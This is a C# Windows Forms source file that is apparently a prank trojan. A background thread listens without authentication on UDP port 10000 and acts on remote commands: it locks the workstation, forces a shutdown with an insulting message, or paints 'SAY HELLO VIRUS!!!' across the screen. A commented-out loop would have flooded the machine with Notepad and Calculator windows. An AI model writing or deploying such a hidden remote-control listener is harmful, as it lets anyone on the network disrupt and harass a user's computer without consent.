using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace WindowsFormsApplication1
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll", SetLastError = true)]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll", SetLastError = true)]
        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
        
        public Form1()
        {
            InitializeComponent();
            
            
            Thread t = new Thread(Listen);
            t.IsBackground = true;
            t.Start();

        }

        public void Listen()
        {
            while (true)
            {
                using (UdpClient cl = new UdpClient(10000))
                {
                    IPEndPoint RemoteIPEndPoint = null;
                    byte[] bytes = cl.Receive(ref RemoteIPEndPoint);
                    string results = Encoding.UTF8.GetString(bytes);
                    if (results == "Lock")
                    {
                        Process.Start("rundll32.exe", "user32.dll, LockWorkStation");
                    }
                    if (results == "Shutdown")
                    {
                        Process.Start("shutdown", "-s -t 60 -c \"Go to HELL!!!!!\"");
                    }
                    if (results == "CancelShutdown")
                    {
                        Process.Start("shutdown", "-a");
                    }
                    if (results == "Ololo")
                    {
                      //  for (int i = 0; i < 20; i++)
                      //  {
                      //      Process.Start("notepad");
                      //      Process.Start("calc");
                      //  }
                        IntPtr hDC = GetDC(IntPtr.Zero);
                        using (Graphics g = Graphics.FromHdc(hDC))
                        {
                            var fontt=new Font("Microsoft Sans Serif", 72F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(204)));
                            g.DrawString("SAY HELLO VIRUS!!!", fontt, Brushes.Red, new Random().Next(0, 300), new Random().Next(0, 800));
                        }
                        ReleaseDC(IntPtr.Zero, hDC);
                    }
                }
            }

        
        }
    }
}
